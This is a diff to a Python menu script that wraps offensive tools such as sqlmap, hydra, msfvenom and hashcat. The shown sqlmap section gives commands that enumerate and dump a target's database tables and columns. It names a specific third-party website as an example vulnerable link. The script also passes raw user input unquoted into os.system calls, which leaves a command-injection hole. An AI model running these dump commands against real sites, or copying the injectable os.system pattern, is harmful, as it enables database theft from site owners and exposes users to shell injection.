@@ -1,5 +1,5 @@
 
-#/usr/bin/python
+#!/usr/bin/env python3
 #blody
 
 import urllib.error
@@ -137,34 +137,35 @@ def rustscan():
 def sqlmap():
     clear()
     print("""
-    [*]Sqlmap Tools
+    [*] Sqlmap Tools
         1|-> -u "https://example.com" --dbs --random-agent
         2|-> -u "https://example.com" -D db_name --tables --random-agent
         3|-> -u "https://example.com" -D db_name -T tb_name --columns --random-agent
         4|-> -u "https://example.com" -D db_name -T tb_name -C cl_name --dump --random-agent 
-    
+
     *|-> ex. vuln link : http://www.suesupriano.com/article.php?id=25
     """)
+    
     choose = input("Id: ")
     link = input("Link: ")
 
-    if(choose == "1"):
-	    os.system(f'sqlmap -u "{link}" --dbs --random-agent')
+    if choose == "1":
+        os.system(f'sqlmap -u "{link}" --dbs --random-agent')
 
-    elif(choose == "2"):
-	    db_name = input("Database name: ")
-	    os.system(f'sqlmap -u "{link}" -D "{db_name}"  --tables --random-agent')
+    elif choose == "2":
+        db_name = input("Database name: ")
+        os.system(f'sqlmap -u "{link}" -D "{db_name}" --tables --random-agent')
 
-    elif(choose == "3"):
-	    db_name = input("Database name: ")
-	    tb_name = input("Tables name: ")
-	    os.system(f'sqlmap -u "{link}" -D {db_name}  -T {tb_name}  --columns --random-agent')
+    elif choose == "3":
+        db_name = input("Database name: ")
+        tb_name = input("Tables name: ")
+        os.system(f'sqlmap -u "{link}" -D {db_name} -T {tb_name} --columns --random-agent')
 
-    elif(choose == "4"):
-	    db_name = input("Database name: ")
-	    tb_name = input("Tables name: ")
-	    cl_name = input("Colon name: ")
-	    os.system(f'sqlmap -u "{link}" -D {db_name}  -T {tb_name}  -C {cl_name}  --dump --random-agent')
+    elif choose == "4":
+        db_name = input("Database name: ")
+        tb_name = input("Tables name: ")
+        cl_name = input("Column name: ")
+        os.system(f'sqlmap -u "{link}" -D {db_name} -T {tb_name} -C {cl_name} --dump --random-agent')
 
     else:
         close()
@@ -593,48 +594,42 @@ def main_menu():
     
     """)
 
-if __name__ == "__main__":
-    while True:
-        try:
-            clear()
-            main_menu()
-            select = input("Enter the tool ID (1-15): ")
+try:
+    clear()
+    main_menu()
+    select = input("Enter the tool ID (1-15): ")
 
-            if select == "1":
-                nmap()
-            elif select == "2":
-                dirsearch()
-            elif select == "3":
-                gobuster()
-            elif select == "4":
-                rustscan()
-            elif select == "5":
-                sqlmap()
-            elif select == "6":
-                wpscan()
-            elif select == "7":
-                httpx()
-            elif select == "8":
-                hydra()
-            elif select == "9":
-                admin()
-            elif select == "10":
-                johntheripper()
-            elif select == "11":
-                msfvenom()
-            elif select == "12":
-                hashcat()
-            elif select == "13":
-                nikto()
-            elif select == "14":
-                enum4linux()
-	        elif select == "15":
-		        ffuf()
-                break
-            else:
-                print("Invalid selection. Please enter a number from 1 to 15.")
-                close()
-
-        except KeyboardInterrupt:
-            print("\nProgram closed. Exiting...")
-            break
+    if select == "1":
+        nmap()
+    elif select == "2":
+        dirsearch()
+    elif select == "3":
+        gobuster()
+    elif select == "4":
+        rustscan()
+    elif select == "5":
+        sqlmap()
+    elif select == "6":
+        wpscan()
+    elif select == "7":
+        httpx()
+    elif select == "8":
+        hydra()
+    elif select == "9":
+        admin()
+    elif select == "10":
+        johntheripper()
+    elif select == "11":
+        msfvenom()
+    elif select == "12":
+        hashcat()
+    elif select == "13":
+        nikto()
+    elif select == "14":
+        enum4linux()
+    elif select == "15":
+        ffuf()
+    else:
+        print("Invalid selection. Please enter a number from 1 to 15.")
+except Exception as e:
+    print(f"\nProgram closed. Exiting...")
